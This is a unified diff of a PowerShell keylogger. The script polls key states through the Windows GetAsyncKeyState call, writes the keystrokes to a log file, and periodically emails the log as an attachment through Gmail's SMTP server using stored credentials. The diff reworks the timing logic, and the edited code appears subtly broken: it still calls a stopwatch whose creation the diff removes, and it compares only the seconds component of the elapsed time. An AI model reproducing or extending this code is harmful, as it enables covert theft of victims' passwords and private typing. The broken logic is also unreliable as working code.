@@ -20,9 +20,10 @@ public static extern short GetAsyncKeyState(int virtualKeyCode);
 
 $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
 
-$date = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+$startDate = Get-Date
+$sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
 Set-Content $path "Keylog"
-Add-Content $path $date
+Add-Content $path $sDate
 Add-Content $path ""
 
 $SMTPServer = 'smtp.gmail.com'
@@ -30,28 +31,31 @@ $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($gmail, $password)
 
-$stopwatch = [system.diagnostics.stopwatch]::StartNew();
 $caps = 0
 
 while($true){
-  if($stopwatch.ElapsedMilliseconds -ge ($period*60000)){
+  $endDate = Get-Date
+  $diff = $endDate - $startDate
+  $sec = $diff.Seconds
+  if($sec -ge ($period*60)){
     $stopwatch.Stop()
     $stopwatch = [system.diagnostics.stopwatch]::StartNew();
     $content = Get-Content 'C:\users\hilld\file.txt'
     if($content.Count -ne 3 -Or $content[2] -ne ''){
-      $endDate = Get-Date -Format "HH:mm:ss"
-      Add-Content $path $endDate
+      $eDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+      Add-Content $path $eDate
       $ReportEmail = New-Object System.Net.Mail.MailMessage
       $ReportEmail.From = $gmail
       $ReportEmail.To.Add($gmail)
-      $ReportEmail.Subject = 'Keylog - ' + $date + '-' + $endDate
+      $ReportEmail.Subject = 'Keylog - ' + $sDate + '-' + $eDate
       $ReportEmail.Attachments.Add($path)
       $SMTPInfo.Send($ReportEmail)
       $ReportEmail.Dispose()
     }
-    $date = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
+    $startDate = Get-Date
+    $sDate = Get-Date -Format "MM/dd/yyyy - HH:mm:ss"
     Set-Content $path "Keylog"
-    Add-Content $path $date
+    Add-Content $path $sDate
     Add-Content $path ""
   }
   $shift1 = $getKeyState::GetAsyncKeyState(160)
